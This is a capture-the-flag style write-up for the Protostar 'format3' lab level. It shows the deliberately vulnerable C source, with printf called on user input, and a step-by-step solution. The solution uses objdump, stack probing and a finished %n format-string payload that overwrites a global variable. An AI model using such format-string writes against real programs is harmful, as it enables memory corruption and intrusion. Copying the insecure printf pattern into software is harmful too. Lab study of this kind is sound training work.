# Protostar - Format 3

### About ###

>This level advances from format2 and shows how to write more than 1 or 2 bytes of memory to the process. This also teaches you to carefully control what data is being written to the process memory.
>
>This level is at `/opt/protostar/bin/format3`

### Source code

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int target;

void printbuffer(char *string)
{
  printf(string);
}

void vuln()
{
  char buffer[512];

  fgets(buffer, sizeof(buffer), stdin);

  printbuffer(buffer);
  
  if(target == 0x01025544) {
      printf("you have modified the target :)\n");
  } else {
      printf("target is %08x :(\n", target);
  }
}

int main(int argc, char **argv)
{
  vuln();
}
```

### Solution 

This exercise is not so different from the ones before. Instead of changing one byte, we'll need to change four. Although, we won't need to write at four different addresses, we can write two bytes at a time.

First, we need to find the address of `target`.

```
user@protostar:/tmp$ objdump -t /opt/protostar/bin/format3 | grep target
080496f4 g     O .bss  	00000004              target
```

Since the address of `target` is `0x080496f4` we are going to use the format string bug to write at the addresses `0x080496f4` and `0x080496f6`. 

The second step is to find where our buffer is located on the stack.

```
user@protostar:/tmp$ for i in $(seq 1 20); do echo $i; python -c "print 'ABCDEFGHIJKLMNOP.%$i\$x'" | format3; echo; done;
1
ABCDEFGHIJKLMNOP.0
target is 00000000 :(
[...]
12
ABCDEFGHIJKLMNOP.44434241 <--- Our pattern
target is 00000000 :(

13
ABCDEFGHIJKLMNOP.48474645
target is 00000000 :(
[...]
```

We can already test if we can change the value of `target` with the following format string:
```
\xf4\x96\x04\x08\xf6\x96\x04\x08%12$x%13$x
```

```
user@protostar:/tmp$ python -c "print '\xf4\x96\x04\x08\xf6\x96\x04\x08%12\$n%13\$n'" | format3
ï¿½
target is 00080008 :(
```

Looks good. :)

Time for some maths. `target` needs to be equal to `0x01025544`. The first value that we are going to write is `0x5544`, 21828 in decimal, at `0x080496f4`. We already wrote 8 bytes, so we need to pad our input with 21820 bytes.

```
\xf4\x96\x04\x08\xf6\x96\x04\x08%21820c%12$x%13$x
```

```
user@protostar:/tmp$ python -c "print '\xf4\x96\x04\x08\xf6\x96\x04\x08%21820c%12\$n%13\$n'" | format3
[...]
target is 55445544 :(
```

The first two bytes are correct, now for the last two, we notice that `0x5544 > 0x0102`. In order to write the correct value, we'll need to overflow the number of bytes already written. It maxes out at 65535, after that it gets back to 0. Thus, to change the last two bytes to `0x0102`, we will write 43966 characters.

```
0x10000 - 0x5544 + 0x0102 = 65536 - 21828 + 258 = 43966
```

We now have the following format string:

```
\xf4\x96\x04\x08\xf6\x96\x04\x08%21820c%12$x%43966c%13$x
```
And it writes the correct value into `target`.

```
user@protostar:/tmp$ python -c "print '\xf4\x96\x04\x08\xf6\x96\x04\x08%21820c%12\$n%43966c%13\$n'" | format3
[...]
you have modified the target :)
```


